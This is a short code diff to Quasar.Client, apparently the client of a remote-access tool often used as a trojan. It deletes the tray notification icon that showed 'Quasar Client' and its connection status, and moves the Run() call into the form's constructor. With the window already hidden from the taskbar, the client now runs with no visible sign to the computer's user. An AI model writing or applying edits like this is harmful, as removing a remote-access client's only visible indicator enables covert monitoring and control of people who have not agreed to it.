@@ -65,6 +65,7 @@ namespace Quasar.Client
         {
             _messageProcessors = new List<IMessageProcessor>();
             _notifyIcon = new NotifyIcon();
+            Run();
         }
 
         /// <summary>
@@ -75,26 +76,7 @@ namespace Quasar.Client
         {
             Visible = false;
             ShowInTaskbar = false;
-            Run();
             base.OnLoad(e);
-        }
-
-        /// <summary>
-        /// Initializes the notification icon.
-        /// </summary>
-        private void InitializeNotifyicon()
-        {
-            _notifyIcon.Text = "Quasar Client\nNo connection";
-            _notifyIcon.Visible = true;
-            try
-            {
-                _notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine(ex);
-                _notifyIcon.Icon = SystemIcons.Application;
-            }
         }
 
         /// <summary>
@@ -142,9 +124,6 @@ namespace Quasar.Client
                 {
                     Debug.WriteLine(e);
                 }
-
-                if (!Settings.UNATTENDEDMODE)
-                    InitializeNotifyicon();
 
                 if (Settings.ENABLELOGGER)
                 {
